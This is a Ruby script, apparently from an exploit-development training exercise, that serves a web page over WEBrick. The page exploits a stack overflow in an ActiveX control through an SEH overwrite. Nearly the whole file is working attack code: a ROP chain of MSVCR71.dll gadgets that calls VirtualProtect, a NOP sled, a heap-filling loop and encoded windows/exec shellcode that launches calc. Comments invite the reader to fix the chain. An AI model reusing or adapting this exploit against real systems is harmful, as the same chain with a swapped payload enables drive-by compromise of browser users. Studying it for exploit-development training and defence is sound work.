#!/usr/bin/ruby
#
# Jared DeMott, VDA Labs, LLC

require 'webrick'

def gen_html

  html = <<EOF
<html>
      
<object classid='clsid:3D5A15F5-DAB1-4132-97C0-9FEBCDB473D6' id='target'></object>
<script language='javascript'>

   function ev1(evt)
   {
      event_obj = document.createEventObject(evt);
      document.getElementById("sp1").innerHTML = "";
      window.setInterval(ev2, 1);
   }

   function packv(n) {
      var s = new Number(n).toString(16);
      while(s.length < 8) s = "0" + s;
      return(unescape("%u" + s.substring(4,8) + "%u" + s.substring(0,4)));
   }
   
   function ev2()
   {
    // windows/exec - 196 bytes
    // VERBOSE=false, EXITFUNC=process, CMD=calc
    var shellcode = unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063");
    
    //allocate_memory
    //#0 pause
    payload = packv(0x7c34d266)     // int 3 ; ret       #take this out
    
    //#1 VirtualProtect from Mona
    payload += packv(0x7c353f00)  //	# POP EBP # RETN [MSVCR71.dll] 
		payload += packv(0x7c353f00)  //	# skip 4 bytes [MSVCR71.dll]
		payload += packv(0x7c354901)  //	# POP EBX # RETN [MSVCR71.dll] 
		payload += packv(0x00000201)  //	# 0x00000201-> ebx       // make this bigger
		payload += packv(0x7c344f87)  //	# POP EDX # RETN [MSVCR71.dll] 
		payload += packv(0x00000040)  //	# 0x00000040-> edx
		payload += packv(0x7c34d201)  //	# POP ECX # RETN [MSVCR71.dll] 
		payload += packv(0x7c38b000)  //	# &Writable location [MSVCR71.dll]
		payload += packv(0x7c34b8d7)  //	# POP EDI # RETN [MSVCR71.dll] 
		payload += packv(0x7c346c0b)  //	# RETN (ROP NOP) [MSVCR71.dll]
		payload += packv(0x7c364802)  //	# POP ESI # RETN [MSVCR71.dll] 
		payload += packv(0x7c3415a2)  //	# JMP [EAX] [MSVCR71.dll]
		payload += packv(0x7c346c0a)  //	# POP EAX # RETN [MSVCR71.dll] 
		payload += packv(0x7c37a140)  //	# ptr to &VirtualProtect() [IAT MSVCR71.dll]
		
		//Can you fix me?   We need to preadjust for that add, because that ad is messing up what we just stored in eax
		
		payload += packv(0x7c378c81)  //	# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
		payload += packv(0x7c345c30)  //	# ptr to 'push esp #  ret ' [MSVCR71.dll]
    
    //#2 Add NOPS and Shellcode
    nops = packv(0x90909090)
    while( nops.length < 100 )
  	  nops += packv(0x90909090);
  	
    payload += nops;  
    payload += shellcode;
    
    while( payload.length < 30000 )
  	  payload += packv(0x200018A4);   //stack pivot - add esp, 0x540
  	
    target.VulnFunc(payload); //trigger stack overflow (SEH overwrite)
    
  }

</script>
</head>
<body>
   <applet></applet>

   <span id="sp1">
   <input type="button" value="Click Me" onclick="ev1(event)">
   </span>        
</body>
</html>
</html>
EOF

  return html
end

#
# WEBrick servlet that serves the HTML
#

class Exploit < WEBrick::HTTPServlet::AbstractServlet

  def do_GET(request, response)
    if request.path == "/rop.html"

      response['Content-Type'] = 'text/html'
      response.body = gen_html
      
    elsif request.path == "/exploit.html"

      response['Content-Type'] = 'text/html'
      response.body = gen_html
    
    else
      raise WEBrick::HTTPStatus::NotFound
    end
  end

end


#
# Main
#
# Disable reverse DNS lookups, they slow things down

BasicSocket.do_not_reverse_lookup = true

# Create a WEBrick server instance

server = WEBrick::HTTPServer.new(
  :Port            => 80
)

server.mount "/", Exploit

# Shutdown on Ctrl-C

trap("INT") { server.shutdown }

# Start the server

server.start
